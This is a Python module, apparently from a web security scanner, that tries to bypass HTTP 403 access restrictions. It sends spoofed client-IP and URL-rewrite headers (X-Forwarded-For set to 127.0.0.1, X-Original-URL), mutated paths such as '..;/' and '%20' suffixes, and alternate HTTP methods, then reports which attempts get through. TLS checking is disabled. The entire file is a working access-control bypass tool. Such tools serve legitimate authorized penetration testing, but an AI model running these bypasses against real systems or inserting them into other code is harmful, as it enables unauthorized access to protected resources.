"""403 Bypass engine: header manipulation, path fuzzing, method swapping."""

from __future__ import annotations

import httpx

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-Port": "443"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Content-Length": "0"},
    {"Referer": "{url}"},
]

PATH_MUTATIONS = [
    lambda p: p + "/",
    lambda p: p + "/.",
    lambda p: p + "..;/",
    lambda p: p + "%20",
    lambda p: p + "%09",
    lambda p: "/" + p.lstrip("/").upper(),
    lambda p: p.replace("/", "//"),
]


async def bypass_403(url: str, path: str, client: httpx.AsyncClient | None = None) -> list[dict]:
    """Attempt to bypass 403 responses. Returns successful bypass methods."""
    if not path:
        return []

    own_client = client is None
    if own_client:
        client = httpx.AsyncClient(verify=False, timeout=10, follow_redirects=False)

    results = []
    try:
        # Header bypasses
        for header_set in BYPASS_HEADERS:
            headers = {k: v.format(path=path, url=url) for k, v in header_set.items()}
            try:
                resp = await client.get(url, headers=headers)
                if resp.status_code not in (403, 401, 500):
                    results.append(
                        {"method": "header", "headers": headers, "status": resp.status_code}
                    )
            except Exception:
                continue

        # Path mutations
        base = url.rsplit(path, 1)[0] if path in url else url.rstrip("/")
        for mutate in PATH_MUTATIONS:
            mutated = base + mutate(path)
            try:
                resp = await client.get(mutated)
                if resp.status_code not in (403, 401, 404, 500):
                    results.append(
                        {"method": "path_fuzz", "url": mutated, "status": resp.status_code}
                    )
            except Exception:
                continue

        # Method swap
        for method in ("POST", "PUT", "PATCH", "OPTIONS"):
            try:
                resp = await client.request(method, url)
                if resp.status_code not in (403, 401, 405, 500):
                    results.append(
                        {"method": "method_swap", "http_method": method, "status": resp.status_code}
                    )
            except Exception:
                continue
    finally:
        if own_client:
            await client.aclose()

    return results
